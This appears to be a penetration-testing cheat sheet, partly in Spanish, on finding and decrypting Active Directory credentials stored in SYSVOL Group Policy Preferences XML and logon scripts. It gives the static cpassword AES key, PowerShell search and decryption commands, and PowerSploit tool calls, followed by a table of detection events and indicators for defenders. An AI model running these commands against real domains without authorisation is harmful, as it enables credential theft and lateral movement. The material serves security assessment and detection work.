## GPP (Preferences XML) / SYSVOL (Logon and Startup)

Both GPP and SYSVOL can expose credentials in Active Directory environments.

- [ ] GPP → credentials or sensitive artifacts within Preferences XML files under `Policies`

```powershell
\\DOMAIN\SYSVOL\DOMAIN\Policies\
```

> Look for `cpassword`, `Registry.xml`, and hardcoded credentials in XML files

- [ ] SYSVOL → credentials or secrets within administrative scripts in `scripts` (search for `.ps1`, `.bat`, `.cmd`, `.vbs` containing plaintext credentials)

```powershell
\\DOMAIN\SYSVOL\DOMAIN\scripts\
```

|Aspect|GPP|SYSVOL|
|---|---|---|
|Artifact Type|Structured XML|Script|
|Typical Path|`Policies\Preferences`|`scripts\`|
|Typical Finding|`cpassword`, autologon, secrets in XML|Plaintext credentials|
|Analysis Type|More structured|More manual|
|Value|Quick and clear findings|Highly useful operational findings|

### GPP: cpassword (Static AES Key)

In some Preferences XML files, the `cpassword` field uses AES-256, but with a static key embedded by Microsoft (the same across all domains), and although it was deprecated in 2014, it is still commonly found in legacy or poorly maintained environments.

```powershell
4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8
f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b
```

- [ ] Common locations

```powershell
\\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
\\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\Machine\Preferences\Services\Services.xml
\\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
\\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\Machine\Preferences\Drives\Drives.xml
\\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\Machine\Preferences\DataSources\DataSources.xml
```


- [ ] GPP Enumeration

```powershell
# Search for cpassword directly (most reliable)
$domain=$env:USERDNSDOMAIN; $pol="\\$domain\SYSVOL\$domain\Policies"; gci $pol -Directory | % { gci $_.FullName -Recurse -Include *.xml -EA SilentlyContinue | % { Select-String -Path $_.FullName -Pattern "cpassword" -EA SilentlyContinue } }

# Search for hardcoded credentials in XML (without cpassword)
$domain=$env:USERDNSDOMAIN; $pol="\\$domain\SYSVOL\$domain\Policies"; gci $pol -Directory | % { gci $_.FullName -Recurse -Include Groups.xml,ScheduledTasks.xml,Services.xml,Drives.xml,DataSources.xml,Printers.xml -EA SilentlyContinue | % { Select-String -Path $_.FullName -Pattern "password|passwd|pwd|user|username|account|cred|credential|domain|net use|runas" -EA SilentlyContinue } }
```

> If no results are returned when searching for `cpassword`, there are no Preferences XML files containing that attribute. This does not rule out other hardcoded secrets within XML files.


- [ ] Cracking

```powershell
# Manual decrypt
gci "\\domain.local\SYSVOL\domain.local\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml" |
Select-String "cpassword" |
ForEach-Object {
    ([System.Text.Encoding]::Unicode.GetString(
        (New-Object System.Security.Cryptography.AesManaged).CreateDecryptor(
            0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,
            0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
            0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,
            0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b
        ).TransformFinalBlock([Convert]::FromBase64String($_.Matches[0].Groups[1].Value),0,$_.Matches[0].Groups[1].Value.Length)
    ))
}
``` 

```powershell
# Descifrar directamente un cpassword ya obtenido
gpp-decrypt 'VALOR_CPASSWORD'
```

```powershell
# PowerSploit
. .\Get-GPPPassword.ps1; Get-GPPPassword
```

### GPP: Autologon (Registry.xml)

`Registry.xml` may contain autologon credentials in plaintext.

```powershell
. .\Get-GPPAutologon.ps1; Get-GPPAutologon
```

### SYSVOL (Logon and Startup)

Many administrators store logon scripts in:

```powershell
\\DOMAIN\SYSVOL\DOMAIN\scripts\
```

It is common to find `.bat`, `.vbs`, `.cmd`, or `.ps1` files containing plaintext credentials, internal paths, administrative shares, or reusable logic.

- [ ] Credential search

```powershell
$domain=$env:USERDNSDOMAIN; ls "\\$domain\SYSVOL\$domain\scripts" -Recurse -Include *.ps1,*.bat,*.cmd,*.vbs | Select-String -Pattern "pass|password|pwd|secret|token|key|cred|credential|net use|runas" -CaseSensitive:$false | ft Path,LineNumber,Line -AutoSize
```

## Events / Telemetry

| Actividad                                                  | Qué puede generar detección                       | Eventos / Logs típicos                                                     | Indicadores (IOCs) comunes                                                                                |
| ---------------------------------------------------------- | ------------------------------------------------- | -------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
| Acceso a SYSVOL / Policies / Scripts vía SMB (listar/leer) | Auditoría de acceso a recursos compartidos        | 5140 (share access), 5145 (detailed file/share access)                     | Lectura recursiva de `\\*\SYSVOL\*\Policies\` / `\\*\SYSVOL\*\scripts\`, múltiples accesos en poco tiempo |
| Acceso a objetos (files/directories)                       | Object Access auditing (si SACL está configurado) | 4656 (handle requested), 4663 (object access)                              | Accesos repetitivos a múltiples XML/scripts dentro de SYSVOL                                              |
| Acceso SMB (cliente/servidor)                              | Logging SMB si está habilitado                    | Microsoft-Windows-SMBClient/SMBServer logs                                 | Patrones de enumeración masiva, acceso a muchos XML/PS1/BAT                                               |
| Enumeración masiva de SYSVOL                               | Correlación por volumen/comportamiento            | 5145 + correlación EDR                                                     | Acceso secuencial a múltiples rutas `Policies\{GUID}` o `scripts\`                                        |
| Ejecución de PowerShell (herramientas/enum)                | PowerShell logging + creación de procesos         | 4104 (ScriptBlock Logging), 4103 (Module Logging), 4688 (Process Creation) | `powershell.exe` ejecutando `Select-String`, `Get-GPPPassword`, rutas SYSVOL                              |
| Uso de herramientas conocidas (PowerSploit, scripts GPP)   | AMSI / firmas / comportamiento                    | Alertas AMSI / EDR (vendor-dependent)                                      | Strings como `Get-GPPPassword`, `Get-GPPAutologon`, contenido típico de cred hunting                      |
| Acceso SYSVOL detectado por EDR                            | Correlación behavioral                            | Alertas EDR                                                                | Enumeración recursiva + búsqueda de strings (`cpassword`, `password`, `autologon`)                        |